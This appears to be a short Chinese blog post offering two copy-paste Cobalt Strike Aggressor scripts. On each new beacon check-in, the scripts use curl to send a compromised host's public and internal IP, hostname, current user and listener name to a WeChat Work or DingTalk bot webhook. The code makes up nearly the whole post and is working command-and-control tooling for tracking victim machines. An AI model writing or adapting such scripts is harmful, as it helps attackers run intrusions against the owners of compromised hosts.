Cobalt Strike上线提醒，主机上线提醒
原理主要是beacon的执行的生命周期初始化的过程进行消息推送。当然还有其他生命周期可以介入。详细可以自行谷歌。以下是手懒族直接用的代码

配置链接参考：
https://zhuanlan.zhihu.com/p/129901896

## 微信机器人版本(自行替换dt_token为对应机器人的值)：

'''
$dt_token = "aaaaaa";
$dt_bot_webhookURL = 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key='.$dt_token;
$targetInfo_txt = "## 有主机上线！\n>";
$listener_txt = "**所属项目：**";
$externalIp_txt = "  \n  >**公网IP：**";
$internalIp_txt = "  \n  >**内网IP：**";
$computerName_txt = "  \n  >**主机名：**";
$userName_txt = "  \n  >**当前用户：**";
on beacon_initial {
    local('$internalIP $computerName $userName');
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $listennerName = replace(beacon_info($1, "listener"), " ", "_");
    $dt_msg = "{\"msgtype\": \"text\",\"text\": {\"content\":"."\"".$targetInfo_txt.$listener_txt.$listennerName.$externalIp_txt.$externalIP.$internalIp_txt.$internalIP.$computerName_txt.$computerName.$userName_txt.$userName."\""."}}";
    @curl_command = @('curl', '-H', 'Content-Type: application/json', '-d', $dt_msg, $dt_bot_webhookURL);
    exec(@curl_command);
}
'''
## 钉钉版本(自行替换dt_token为对应机器人的值)：
'''
$dt_token = "bbbbbb";
$dt_bot_webhookURL = 'https://oapi.dingtalk.com/robot/send?access_token='.$dt_token;
$targetInfo_txt = "## 有主机上线！\n>";
$listener_txt = "**所属项目：**";
$externalIp_txt = "  \n  >**公网IP：**";
$internalIp_txt = "  \n  >**内网IP：**";
$computerName_txt = "  \n  >**主机名：**";
$userName_txt = "  \n  >**当前用户：**";
on beacon_initial {
    local('$internalIP $computerName $userName');
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $listennerName = replace(beacon_info($1, "listener"), " ", "_");
    $dt_msg = "{\"msgtype\": \"markdown\",\"markdown\": {\"title\":\"新主机上线\",\"text\":"."\"".$targetInfo_txt.$listener_txt.$listennerName.$externalIp_txt.$externalIP.$internalIp_txt.$internalIP.$computerName_txt.$computerName.$userName_txt.$userName."\""."}}";
    @curl_command = @('curl', '-H', 'Content-Type: application/json', '-d', $dt_msg, $dt_bot_webhookURL);
    exec(@curl_command);
}
'''
